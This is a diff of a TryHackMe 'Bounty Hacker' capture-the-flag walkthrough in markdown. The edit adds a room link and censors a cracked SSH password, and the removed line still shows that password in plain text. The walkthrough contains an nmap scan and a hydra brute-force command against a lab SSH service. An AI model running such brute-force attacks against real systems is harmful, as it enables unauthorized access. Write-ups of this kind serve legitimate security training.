@@ -9,7 +9,9 @@ tags:
   - Walkthrough
   - Writeup
   - Bounty Hacker
----
+---  
+
+[Link to Room](https://tryhackme.com/room/cowboyhacker)  
 
 Start off with an nmap scan:
 `sudo nmap -A 10.10.144.76 -v`   
@@ -70,7 +72,7 @@ Turns out, the task.txt file gives us a username `lin`, so lets try to bruteforc
 `hydra -l lin -P locks.txt ssh://10.10.144.76 -t 4`  
 The -t 4 flag only runs 4 tasks at once, since many SSH configurations wont allow more.
 After a little bit we get the login:
-`[22][ssh] host: 10.10.144.76   login: lin   password: RedDr4gonSynd1cat3`  
+`[22][ssh] host: 10.10.144.76   login: lin   password: <CENSORED>`  
 Great, now lets try to SSH in ourselves.
 ```
 $ ssh lin@10.10.144.76
